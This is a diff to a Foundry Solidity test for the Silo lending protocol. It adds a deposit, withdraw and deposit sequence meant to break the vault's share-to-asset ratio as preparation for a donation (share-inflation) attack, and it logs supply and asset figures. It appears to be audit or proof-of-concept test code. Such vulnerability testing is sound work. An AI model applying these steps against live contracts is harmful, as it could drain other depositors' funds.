@@ -115,12 +115,21 @@ contract DepositTest is SiloLittleHelper, Test {
 
         vm.prank(borrower);
         silo0.withdraw(borrowerAssets, borrower, borrower);
+        silo0.accrueInterest();
         console.log("*** Repay interest and withdraw to break 1:1 share-to-asset ratio for donation attack preparation ***");
         console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
         console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
 
-        _makeDeposit(silo0, token0, 500*one, depositor, ISilo.CollateralType.Collateral);
-        console.log("*** After first user deposits 500 ***");
+        uint toDepositMore = 5*one;
+        _makeDeposit(silo0, token0, toDepositMore, depositor, ISilo.CollateralType.Collateral);
+        vm.prank(depositor);
+        silo0.withdraw(toDepositMore, depositor, depositor);
+        _makeDeposit(silo0, token0, one, depositor, ISilo.CollateralType.Collateral);
+
+        // plus one to numerator
+        // plus one to denumenator
+        _makeDeposit(silo0, token0, 1000 * one, depositor, ISilo.CollateralType.Collateral);
+        console.log("*** After first user deposits ", toDepositMore, " ***");
         console.log("collateralShareToken.totalSupply(): ", IShareToken(collateral.collateralShareToken).totalSupply());
         console.log("silo0.getCollateralAssets(): ", silo0.getCollateralAssets());
 
